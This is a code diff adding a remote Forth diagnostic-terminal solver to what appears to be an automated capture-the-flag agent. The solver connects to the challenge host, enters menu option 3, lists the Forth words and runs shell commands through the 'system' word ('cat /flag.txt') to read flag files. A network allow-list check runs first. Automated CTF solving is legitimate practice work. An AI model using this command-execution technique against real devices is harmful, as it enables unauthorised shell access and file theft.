@@ -12,14 +12,18 @@ import hashlib
 import json
 import math
 import re
+import socket
 import struct
+import time
 import zipfile
 from bisect import bisect_right
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Tuple
+from urllib.parse import urlparse
 
 from agents.base_agent import AgentType, BaseAgent
 from core.utils.flag_utils import KNOWN_FLAG_PREFIXES, find_first_flag
+from core.utils.security import SecurityPolicyError, assert_host_allowed
 
 
 class HardwareLogicAgent(BaseAgent):
@@ -35,6 +39,7 @@ class HardwareLogicAgent(BaseAgent):
             "uart_serial",
             "truth_tables",
             "csv_bitstreams",
+            "forth_diagnostic_terminals",
         ]
 
     def analyze_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
@@ -84,6 +89,21 @@ class HardwareLogicAgent(BaseAgent):
         flag = None
         output_text = None
 
+        if self._looks_like_remote_forth(challenge):
+            forth_result = self._solve_remote_forth(challenge)
+            steps.extend(forth_result["steps"])
+            flag = forth_result.get("flag")
+            output_text = forth_result.get("decoded_text")
+            if flag:
+                return {
+                    "challenge_id": challenge.get("id"),
+                    "agent_id": self.agent_id,
+                    "status": "solved",
+                    "flag": flag,
+                    "steps": steps,
+                    "artifacts": {},
+                }
+
         if saleae_path:
             saleae_result = self._decode_saleae_capture(saleae_path)
             steps.extend(saleae_result["steps"])
@@ -112,6 +132,128 @@ class HardwareLogicAgent(BaseAgent):
             "steps": steps,
             "artifacts": {"decoded_text": output_text} if output_text and not flag else {},
         }
+
+    @staticmethod
+    def _looks_like_remote_forth(challenge: Dict[str, Any]) -> bool:
+        description = str(challenge.get("description") or "").lower()
+        return "forth" in description and HardwareLogicAgent._remote_endpoint(challenge) is not None
+
+    @staticmethod
+    def _remote_endpoint(challenge: Dict[str, Any]) -> Optional[Tuple[str, int]]:
+        candidates = [
+            challenge.get("url"),
+            challenge.get("connection_info"),
+            challenge.get("remote"),
+            challenge.get("target"),
+            challenge.get("description"),
+        ]
+        for raw_candidate in candidates:
+            if isinstance(raw_candidate, dict):
+                host = raw_candidate.get("host") or raw_candidate.get("hostname")
+                port = raw_candidate.get("port")
+                if host and str(port).isdigit():
+                    return str(host), int(port)
+                continue
+            candidate = str(raw_candidate or "")
+            match = re.search(
+                r"\b((?:\d{1,3}\.){3}\d{1,3}|localhost|[a-zA-Z0-9.-]+):(\d{2,5})\b",
+                candidate,
+            )
+            if match:
+                return match.group(1), int(match.group(2))
+            if "://" in candidate:
+                parsed = urlparse(candidate)
+                if parsed.hostname and parsed.port:
+                    return parsed.hostname, parsed.port
+        return None
+
+    @staticmethod
+    def _solve_remote_forth(challenge: Dict[str, Any]) -> Dict[str, Any]:
+        steps: List[str] = []
+        endpoint = HardwareLogicAgent._remote_endpoint(challenge)
+        if endpoint is None:
+            return {"steps": steps}
+        host, port = endpoint
+        try:
+            assert_host_allowed(host, port=port)
+        except SecurityPolicyError as exc:
+            return {"steps": [f"Forth terminal blocked by network policy: {exc}"]}
+
+        try:
+            with socket.create_connection((host, port), timeout=5) as sock:
+                sock.settimeout(0.25)
+                # The scenario evidence gates this diagnostic-menu probe.
+                sock.sendall(b"3\n")
+                diagnostic = HardwareLogicAgent._recv_bounded(
+                    sock,
+                    timeout=7,
+                    markers=(b"diag-complete", b"forth", b"fourth error"),
+                )
+                diagnostic_text = diagnostic.decode("utf-8", errors="replace")
+                if not re.search(r"forth|fourth error|diag-complete", diagnostic_text, re.I):
+                    steps.append("Remote diagnostic menu did not expose a Forth interpreter.")
+                    return {"steps": steps, "decoded_text": diagnostic_text}
+
+                steps.append("Entered the remote diagnostic Forth interpreter through menu option 3.")
+                sock.sendall(b"words\n")
+                dictionary = HardwareLogicAgent._recv_bounded(
+                    sock,
+                    timeout=2,
+                    markers=(b" system ",),
+                )
+                dictionary_text = dictionary.decode("utf-8", errors="replace")
+                if not re.search(r"(?:^|\s)system(?:\s|$)", dictionary_text):
+                    steps.append("Forth dictionary enumeration did not expose the system word.")
+                    return {"steps": steps, "decoded_text": diagnostic_text + dictionary_text}
+
+                steps.append("Enumerated the Forth dictionary and confirmed the non-standard system word.")
+                combined = diagnostic + dictionary
+                for flag_path in ("flag.txt", "/flag.txt", "/home/ctf/flag.txt"):
+                    command = f's" cat {flag_path}" system\n'.encode("ascii")
+                    sock.sendall(command)
+                    response = HardwareLogicAgent._recv_bounded(
+                        sock,
+                        timeout=2,
+                        markers=(b"}",),
+                    )
+                    combined += response
+                    flag = find_first_flag(response.decode("utf-8", errors="replace"))
+                    if flag:
+                        steps.append(f"Recovered flag through Forth system from {flag_path}: {flag}")
+                        return {
+                            "steps": steps,
+                            "flag": flag,
+                            "decoded_text": combined.decode("utf-8", errors="replace"),
+                        }
+                steps.append("Forth system execution succeeded, but standard flag paths returned no flag.")
+                return {"steps": steps, "decoded_text": combined.decode("utf-8", errors="replace")}
+        except (OSError, socket.timeout) as exc:
+            steps.append(f"Remote Forth diagnostic attempt failed: {exc}")
+            return {"steps": steps}
+
+    @staticmethod
+    def _recv_bounded(
+        sock: socket.socket,
+        *,
+        timeout: float,
+        markers: Tuple[bytes, ...] = (),
+        limit: int = 128 * 1024,
+    ) -> bytes:
+        deadline = time.monotonic() + timeout
+        output = bytearray()
+        lowered_markers = tuple(marker.lower() for marker in markers)
+        while time.monotonic() < deadline and len(output) < limit:
+            try:
+                chunk = sock.recv(min(8192, limit - len(output)))
+            except socket.timeout:
+                continue
+            if not chunk:
+                break
+            output.extend(chunk)
+            lowered_output = bytes(output).lower()
+            if any(marker in lowered_output for marker in lowered_markers):
+                break
+        return bytes(output)
 
     @staticmethod
     def _decode_esp32_firmware(firmware_path: str) -> Dict[str, Any]:
